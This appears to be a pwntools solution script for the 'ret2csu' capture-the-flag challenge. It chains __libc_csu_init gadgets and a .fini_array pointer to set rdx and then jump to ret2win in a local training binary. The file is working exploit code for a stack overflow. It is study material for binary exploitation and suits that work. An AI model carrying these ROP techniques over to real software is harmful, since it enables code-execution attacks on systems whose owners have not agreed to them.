from pwn import *

elf = ELF('ret2csu')
io = process(elf.path)

# mov rdx, r15
# mov rsi, r14
# mov edi, r13d
# call [r12+rbx*8]
mov_call_gadget = p64(0x0000000000400880)

# pop rbx
# pop rbp
# pop r12
# pop r13
# pop r14
# pop r15
pop_gadgets = p64(0x000000000040089a)

# 0x00000000004008b4 - 0x00000000004008bd is .fini
# _fini:  0x00000000004008b4

# 0x0000000000600e18 - 0x0000000000600e20 is .fini_array
# pointer to address of _fini (in .fini_array section)
_fini = p64(0x600e48)

ret2win = p64(0x00000000004007b1)
pad = 'A'*40
trash = "A"*8

ret  = pad
ret += pop_gadgets
ret += p64(0x0) # rbx = 0 (inc remented in _fini func)
ret += p64(0x1) # rbp = 1 (need to be 1 for jne in csu)
ret += _fini    # r12
ret += trash    # r13
ret += trash    # r14
ret += p64(0xdeadcafebabebeef) # pop r15
ret += mov_call_gadget
ret += trash*7       
ret += ret2win

io.recvuntil("> ")
io.sendline(ret)

recv = io.recvall()
log.success(recv)

# NOTE #
# could also use the init_array_entry (instead of _fini_array)
# we could also set rbp when doing the overflow (last 8 bytes) 
# but we will just use the gadget in csu.
